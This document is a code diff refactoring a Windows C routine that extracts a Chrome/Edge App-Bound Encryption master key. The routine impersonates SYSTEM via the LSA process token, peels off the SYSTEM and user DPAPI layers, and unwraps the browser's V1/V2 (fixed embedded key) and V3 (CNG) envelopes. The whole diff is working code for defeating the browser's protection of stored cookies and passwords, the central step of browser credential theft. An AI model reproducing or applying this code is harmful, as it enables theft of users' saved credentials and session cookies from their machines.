@@ -45,14 +45,14 @@ AbeV1V2Unwrap(
    SYSTEM profile's Microsoft Software KSP store) */
 static BOOL
 AbeV3Unwrap(
-    _In_ const ABE_BROWSER* Browser,
+    _In_ const ABE_BROWSER* Entry,
     _In_reads_bytes_(ABE_V3_ENVELOPE_SIZE) const BYTE* Envelope,
     _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
 {
     NCRYPT_PROV_HANDLE Provider = 0;
     NCRYPT_KEY_HANDLE CngKey = 0;
     BYTE Derived[ABE_KEY_SIZE];
-    DWORD Length = 0;
+    DWORD Length;
     SECURITY_STATUS St;
     NTSTATUS Status;
     ULONG i;
@@ -63,10 +63,10 @@ AbeV3Unwrap(
         AbeLog(L"V3: NCryptOpenStorageProvider failed, 0x%08lX\r\n", (unsigned long)St);
         return FALSE;
     }
-    St = NCryptOpenKey(Provider, &CngKey, Browser->CngKey, 0, 0);
+    St = NCryptOpenKey(Provider, &CngKey, Entry->CngKey, 0, 0);
     if (FAILED(St))
     {
-        AbeLog(L"V3: NCryptOpenKey(%ls) failed, 0x%08lX\r\n", Browser->CngKey, (unsigned long)St);
+        AbeLog(L"V3: NCryptOpenKey(%ls) failed, 0x%08lX\r\n", Entry->CngKey, (unsigned long)St);
         NCryptFreeObject(Provider);
         return FALSE;
     }
@@ -82,9 +82,14 @@ AbeV3Unwrap(
                        NCRYPT_SILENT_FLAG);
     NCryptFreeObject(CngKey);
     NCryptFreeObject(Provider);
-    if (FAILED(St) || Length != ABE_KEY_SIZE)
+    if (FAILED(St))
     {
-        AbeLog(L"V3: NCryptDecrypt failed, 0x%08lX (len=%lu)\r\n", (unsigned long)St, Length);
+        AbeLog(L"V3: NCryptDecrypt failed, 0x%08lX\r\n", (unsigned long)St);
+        return FALSE;
+    }
+    if (Length != ABE_KEY_SIZE)
+    {
+        AbeLog(L"V3: NCryptDecrypt returned %lu bytes\r\n", Length);
         return FALSE;
     }
 
@@ -103,26 +108,92 @@ AbeV3Unwrap(
     if (!NT_SUCCESS(Status))
     {
         AbeLog(L"V3: AES-256-GCM verification failed, 0x%08lX (bad tag?)\r\n", Status);
+        return FALSE;
     }
-    return NT_SUCCESS(Status);
+    return TRUE;
 }
 
+/* innermost user-DPAPI payload: [u32 len][validation data][u32 len][payload];
+   legacy Edge carries a raw key, Chrome/Edge a private envelope V1/V2/V3 */
+static BOOL
+AbeUnwrapInnerPayload(
+    _In_ const ABE_BROWSER* Entry,
+    _In_reads_bytes_(Size) const BYTE* Data,
+    _In_ DWORD Size,
+    _In_ HANDLE SystemToken,
+    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key,
+    _Out_ PULONG EnvelopeVersion)
+{
+    ULONG ValidationLength, PayloadLength;
+    const BYTE* Payload;
+
+    /* every subtraction below is guarded by the previous check, no overflow */
+    if (Size < 8)
+    {
+        goto _Malformed;
+    }
+    RtlCopyMemory(&ValidationLength, Data, sizeof(ValidationLength));
+    if (ValidationLength > Size - 8)
+    {
+        goto _Malformed;
+    }
+    RtlCopyMemory(&PayloadLength, Data + 4 + ValidationLength, sizeof(PayloadLength));
+    Payload = Data + 8 + ValidationLength;
+    if (PayloadLength > Size - 8 - ValidationLength)
+    {
+        goto _Malformed;
+    }
+
+    if (PayloadLength == ABE_V3_ENVELOPE_SIZE && Payload[0] == 3)
+    {
+        /* V3: the CNG unwrap must run as SYSTEM */
+        *EnvelopeVersion = 3;
+        if (!NT_SUCCESS(PS_Impersonate(SystemToken)))
+        {
+            return FALSE;
+        }
+        {
+            BOOL Ok = AbeV3Unwrap(Entry, Payload, Key);
+
+            PS_Impersonate(NULL);
+            return Ok;
+        }
+    }
+    if (PayloadLength == ABE_V12_ENVELOPE_SIZE && Payload[0] >= 1 && Payload[0] <= 2)
+    {
+        /* V1/V2: fixed embedded key, any context */
+        *EnvelopeVersion = Payload[0];
+        return AbeV1V2Unwrap(Payload[0], Payload, Key);
+    }
+    if (PayloadLength == ABE_KEY_SIZE)
+    {
+        *EnvelopeVersion = 0;
+        RtlCopyMemory(Key, Payload, ABE_KEY_SIZE);
+        return TRUE;
+    }
+    AbeLog(L"Elevate: unsupported payload (%lu bytes)\r\n", PayloadLength);
+    return FALSE;
+
+_Malformed:
+    AbeLog(L"Elevate: malformed inner data (%lu bytes)\r\n", Size);
+    return FALSE;
+}
+
+_Success_(return)
 BOOL
 AbeGetKeyElevate(
     _In_ const NET_BROWSER_INFO* Browser,
-    _In_ const ABE_BROWSER* Entry,
     _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key,
     _Out_opt_ PULONG EnvelopeVersion)
 {
     static BYTE Blob[4096];
-    DATA_BLOB In, Out = { 0 };
-    DWORD BlobLength = sizeof(Blob);
-    ULONG LsaProcessId, Envelope = 0;
+    DATA_BLOB In, Out = { 0 };          /* Out is freed on failure paths */
+    ULONG BlobLength = sizeof(Blob);    /* in/out capacity */
+    ULONG LsaProcessId, Envelope;
     HANDLE SystemToken = NULL;
     NTSTATUS Status;
     BOOL Ok = FALSE;
 
-    if (EnvelopeVersion != NULL) *EnvelopeVersion = 0;
     if (!AbeReadOsCryptBlob(Browser->UserDataDir,
                             L"app_bound_encrypted_key",
                             Blob,
@@ -149,94 +220,48 @@ AbeGetKeyElevate(
     /* layer 1: SYSTEM DPAPI */
     In.pbData = Blob + 4;
     In.cbData = BlobLength - 4;
-    if (NT_SUCCESS(PS_Impersonate(SystemToken)))
+    Status = PS_Impersonate(SystemToken);
+    if (!NT_SUCCESS(Status))
     {
-        if (!CryptUnprotectData(&In, NULL, NULL, NULL, NULL, 0, &Out))
-        {
-            PS_Impersonate(NULL);
-            NtClose(SystemToken);
-            AbeLog(L"Elevate: SYSTEM DPAPI decrypt failed, gle=%lu\r\n", Err_GetLastError());
-            return FALSE;
-        }
-        PS_Impersonate(NULL);
-    } else
-    {
-        NtClose(SystemToken);
         AbeLog(L"Elevate: impersonating SYSTEM failed, 0x%08lX\r\n", Status);
-        return FALSE;
+        goto _Exit;
     }
+    if (!CryptUnprotectData(&In, NULL, NULL, NULL, NULL, 0, &Out))
+    {
+        PS_Impersonate(NULL);
+        AbeLog(L"Elevate: SYSTEM DPAPI decrypt failed, gle=%lu\r\n", Err_GetLastError());
+        goto _Exit;
+    }
+    PS_Impersonate(NULL);
 
     /* layer 2: user DPAPI, then unwrap the innermost structure */
+    In.pbData = Out.pbData;
+    In.cbData = Out.cbData;
     {
-        DATA_BLOB Final = { 0 };
-        DWORD ValidationLength, PayloadLength;
-        const BYTE* Payload;
-        BOOL Parsed = FALSE;
+        DATA_BLOB Final = { 0 };        /* Final is freed on all paths below */
 
-        In.pbData = Out.pbData;
-        In.cbData = Out.cbData;
         if (!CryptUnprotectData(&In, NULL, NULL, NULL, NULL, 0, &Final))
         {
-            LocalFree(Out.pbData);
-            NtClose(SystemToken);
             AbeLog(L"Elevate: user DPAPI decrypt failed, gle=%lu\r\n", Err_GetLastError());
-            return FALSE;
-        }
-        LocalFree(Out.pbData);
-
-        /* innermost: [u32 len][validation data][u32 len][payload]
-           (legacy Edge payload: raw key; Chrome/Edge: private envelope V1/V2/V3) */
-        if (Final.cbData >= 8)
+        } else
         {
-            RtlCopyMemory(&ValidationLength, Final.pbData, sizeof(ValidationLength));
-            RtlCopyMemory(&PayloadLength,
-                          Final.pbData + 4 + ValidationLength,
-                          sizeof(PayloadLength));
-            Payload = Final.pbData + 8 + ValidationLength;
-            if ((ULONGLONG)(Payload - Final.pbData) + PayloadLength == Final.cbData)
-            {
-                Parsed = TRUE;
-
-                if (PayloadLength == ABE_V3_ENVELOPE_SIZE && Payload[0] == 3)
-                {
-                    /* V3: the CNG unwrap must run as SYSTEM */
-                    Envelope = 3;
-                    if (NT_SUCCESS(PS_Impersonate(SystemToken)))
-                    {
-                        Ok = AbeV3Unwrap(Entry, Payload, Key);
-                        PS_Impersonate(NULL);
-                    }
-                } else if (PayloadLength == ABE_V12_ENVELOPE_SIZE &&
-                           (Payload[0] == 1 || Payload[0] == 2))
-                {
-                    /* V1/V2: fixed embedded key, any context */
-                    Envelope = Payload[0];
-                    Ok = AbeV1V2Unwrap(Envelope, Payload, Key);
-                } else if (PayloadLength == ABE_KEY_SIZE)
-                {
-                    RtlCopyMemory(Key, Payload, ABE_KEY_SIZE);
-                    Ok = TRUE;
-                } else
-                {
-                    AbeLog(L"Elevate: unsupported payload (%lu bytes)\r\n", PayloadLength);
-                }
-            }
+            Ok = AbeUnwrapInnerPayload(&AbeBrowsers[Browser->Type],
+                                       Final.pbData,
+                                       Final.cbData,
+                                       SystemToken,
+                                       Key,
+                                       &Envelope);
+            RtlSecureZeroMemory(Final.pbData, Final.cbData);
         }
-        if (!Parsed)
-        {
-            AbeLog(L"Elevate: malformed inner data (%lu bytes)\r\n", Final.cbData);
-        }
-        RtlSecureZeroMemory(Final.pbData, Final.cbData);
         LocalFree(Final.pbData);
     }
+    LocalFree(Out.pbData);
+
+_Exit:
     NtClose(SystemToken);
     if (Ok && EnvelopeVersion != NULL)
     {
         *EnvelopeVersion = Envelope;
-        if (Envelope != 0)
-        {
-            AbeLog(L"Elevate: v20 private envelope version V%lu\r\n", Envelope);
-        }
     }
     return Ok;
 }
